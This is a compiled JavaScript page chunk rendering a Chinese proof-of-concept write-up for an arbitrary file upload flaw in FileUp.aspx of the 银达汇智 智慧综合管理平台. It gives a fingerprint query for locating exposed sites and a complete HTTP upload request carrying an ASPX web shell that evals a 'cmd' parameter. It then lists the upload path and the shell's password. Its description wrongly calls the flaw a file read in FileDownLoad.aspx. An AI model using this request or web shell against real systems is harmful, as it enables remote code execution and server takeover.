(window.webpackJsonp=window.webpackJsonp||[]).push([[192],{2069:function(s,a,t){s.exports=t.p+"assets/img/1627914977251-450973a6-e847-454b-817b-efa35fdc4aed.72080f3d.png"},2070:function(s,a,t){s.exports=t.p+"assets/img/1629368451848-7ecbcd3e-82cc-4608-b9a9-a312826248ea.5453e485.png"},2071:function(s,a,t){s.exports=t.p+"assets/img/1629368525052-fffda86a-30fa-4dc0-a3a0-537a0be5b5c3.e3e58eb8.png"},2609:function(s,a,t){"use strict";t.r(a);var n=t(75),e=Object(n.a)({},(function(){var s=this,a=s.$createElement,n=s._self._c||a;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"银达汇智-智慧综合管理平台-fileup-aspx-任意文件上传漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#银达汇智-智慧综合管理平台-fileup-aspx-任意文件上传漏洞"}},[s._v("#")]),s._v(" 银达汇智 智慧综合管理平台 FileUp.aspx 任意文件上传漏洞")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件")]),s._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("银达汇智 智慧综合管理平台 ")]),n("br"),s._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v('"汇智信息" && title=="智慧综合管理平台登入"')]),n("br"),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("登陆页面")]),s._v(" "),n("p",[n("img",{attrs:{src:t(2069),alt:"img"}})]),s._v(" "),n("p",[s._v("文件上传请求包")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[s._v("POST /Module/FileUpPage/FileUp.aspx?orgid"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("type")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("NNewsContent HTTP/1.1\nHost: \nAccept-Encoding: identity\nContent-Length: "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("337")]),s._v("\nAccept-Language: zh-CN,zh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.8")]),s._v("\nAccept: */*\nUser-Agent: Mozilla/5.0 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Windows NT "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" rv:5.0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Gecko/20100101 Firefox/5.0\nAccept-Charset: GBK,utf-8"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.7")]),s._v(",*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.3")]),s._v("\nConnection: keep-alive\nCache-Control: max-age"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nContent-Type: multipart/form-data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("boundary")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("62907949903a4c499178971c9dab4ad9\n\n--62907949903a4c499178971c9dab4ad9\nContent-Disposition: form-data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("name")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Filedata"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("filename")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"abc.aspx"')]),s._v("\nContent-Type: image/jpeg\n\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("%@ Page "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Language")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Jscript"')]),s._v("%"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("%Response.Write"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("FormsAuthentication.HashPasswordForStoringInConfigFile"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"abc"')]),s._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"MD5"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".ToLower"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("))")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("eval"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Request.Item"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cmd"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(","),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"unsafe"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("%"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n--62907949903a4c499178971c9dab4ad9--\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br")])]),n("p",[n("img",{attrs:{src:t(2070),alt:"img"}})]),s._v(" "),n("p",[s._v("响应包会返回文件名，上传的目录为")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[s._v("/imgnews/imgcontent/1/xxxxxxxxxx.aspx\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:t(2071),alt:"img"}})]),s._v(" "),n("p",[s._v("出现如图成功上传木马，密码为 "),n("strong",[s._v("cmd")])])],1)}),[],!1,null,null,null);a.default=e.exports}}]);